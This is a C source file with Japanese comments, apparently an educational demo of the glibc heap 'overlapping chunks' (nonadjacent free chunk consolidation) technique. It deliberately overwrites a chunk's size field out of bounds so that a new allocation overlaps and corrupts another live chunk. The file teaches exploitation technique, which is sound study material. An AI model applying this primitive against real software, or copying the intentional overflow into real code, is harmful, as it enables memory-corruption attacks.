/*
 オーバーラップするチャンク(overlapping chunk)についての、もうひとつの簡単な話です。

 この手法は、次の資料から取っています。
 https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
 
 これは Nonadjacent Free Chunk Consolidation Attack(隣接しない空きチャンクの統合攻撃)とも呼ばれます。

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  fprintf(stderr, "\nこれは、チャンクがオーバーラップするという単純な問題です");
  fprintf(stderr, "\nこれは Nonadjacent Free Chunk Consolidation Attack(隣接しない空きチャンクの統合攻撃)とも呼ばれます\n");
  fprintf(stderr, "\nまず、ヒープ上に5つのチャンク(chunk)を割り当てましょう:");

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr, "\n\nチャンク p1: %p から %p まで", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr, "\nチャンク p2: %p から %p まで", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr, "\nチャンク p3: %p から %p まで", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr, "\nチャンク p4: %p から %p まで", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr, "\nチャンク p5: %p から %p まで\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
  
  fprintf(stderr, "\nチャンク p4 を解放(free)しましょう。\nこの場合、p4 の後ろにtop chunkと接する p5 があるため、p4 はtop chunkと統合(coalesce)されません\n"); 
  
  free(p4);

  fprintf(stderr, "\nチャンク p1 の脆弱性を発動させて、使用中のチャンク p2 のサイズを\nチャンク p2 のサイズ + チャンク p3 のサイズで上書きしましょう\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 

  fprintf(stderr, "\nこれで、p2 に対する free() の処理中に、アロケータは \n次のチャンク(nextchunk)が p4 であると騙されます( p2 + size_p2 が p4 を指すようになったためです ) \n");
  fprintf(stderr, "\nこの操作により、p3 を誤って含む大きな空きチャンクが作られます\n");
  free(p2);
  
  fprintf(stderr, "\n次に、先ほど解放したチャンクで満たせるサイズの新しいチャンクを割り当てましょう\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nmalloc() は、私たちが作り込んだ大きな空きチャンクで満たされました。これで p6 と p3 がオーバーラップしており、 \nチャンク p6 に書き込むことで p3 内のデータを上書きできます\n");
  fprintf(stderr, "\nチャンク p6: %p から %p まで", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr, "\nチャンク p3: %p から %p まで\n", p3, (unsigned char *) p3+real_size_p3); 

  fprintf(stderr, "\nチャンク p3 内のデータ: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); 

  fprintf(stderr, "\np6 の中に何か書き込みましょう\n");
  memset(p6,'F',1500);  
  
  fprintf(stderr, "\nチャンク p3 内のデータ: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); 


}
